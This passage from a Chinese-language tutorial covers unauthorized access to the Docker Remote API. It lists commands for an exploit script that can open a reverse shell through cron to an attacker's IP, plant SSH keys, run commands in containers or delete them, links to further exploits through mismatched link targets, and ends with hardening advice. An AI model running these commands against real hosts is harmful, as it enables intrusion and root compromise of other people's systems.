  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a
* 查看所有镜像
  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l
* 查看端口映射
  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L
* 写计划任务（centos,redhat等,加-u参数用于ubuntu等）
  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口
  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口
* 写sshkey\(自行修改脚本的中公钥\)
  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k
* 在容器中执行命令
  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e `"id"` -I 容器id
* 删除容器
  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id
* 修改client api版本
  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22
* 查看服务端api版本
  python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V

3.3 其他的一些exp

[https://github.com/netxfly/docker-remote-api-exp](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[https://github.com/zer0yu/SomePoC/blob/master/Docker/Docker\_Remote\_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.py](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

[https://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8](https://bbs.ichunqiu.com/thread-39749-1-1.html?from=beef)

## 4. 防护策略

1.修改 Docker Remote API 服务默认参数。注意：该操作需要重启 Docker 服务才能生效。

2.修改 Docker 的启动参数：  
定位到 DOCKER\_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1  
或将默认端口 2375 改为自定义端口  
为 Remote API 设置认证措施。参照 官方文档 配置 Remote API 的认证措施。

3.注意：该操作需要重启 Docker 服务才能生效。  
修改 Docker 服务运行账号。请以较低权限账号运行 Docker 服务；另外，可以限制攻击者执行高危命令。

4.注意：该操作需要重启 Docker 服务才能生效。  
设置防火墙策略。如果正常业务中 API 服务需要被其他服务器来访问，可以配置安全组策略或 iptables 策略，仅允许指定的 IP 来访问 Docker 接口。

